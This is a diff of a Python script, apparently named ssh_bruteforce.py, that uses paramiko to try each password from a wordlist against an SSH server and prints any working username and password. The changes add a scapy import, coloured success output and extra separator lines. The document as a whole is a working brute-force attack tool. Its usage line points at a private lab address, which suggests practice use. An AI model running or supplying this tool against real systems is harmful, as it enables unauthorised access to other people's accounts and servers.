@@ -2,6 +2,7 @@
 import paramiko
 import sys
 import subprocess
+from scapy.all import *
 
 count = 1
 
@@ -12,24 +13,26 @@ def usage():
     print()
     print("sudo python3 ssh_bruteforce.py -t 10.0.2.5 -f <password file list> -u <username>")
 
-
-
-
 def connectSSH(hostname, port, username, passFile):
+    
+    #filename = sys.argv[sys.argv.index("-d")+1]
     client = paramiko.SSHClient()
     client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
     with open(passFile, "r") as f:
         global count
         for password in f.readlines():
             password = password.strip()
+            
             try:
                 client.connect(hostname, port=port, username=username, password=password)
-                print("[" + str(count) + "] " + "[+] Password Success ~ " + password)
+                
+                print("[" + str(count) + "] " + "\x1b[0;30;42m"f"[+] Password Success ~ " + password + "\x1b[0m\n")
                 print("*" * 50)
                 print("HostName: " + hostname)
                 print("Credentials: " + username + ":" + password)
+                
+                print("*" * 50)                
 
-                print("*" * 50)
                 break
             except:
                 print("[" + str(count) + "] " + "[-] Password Failed ~ " + password)
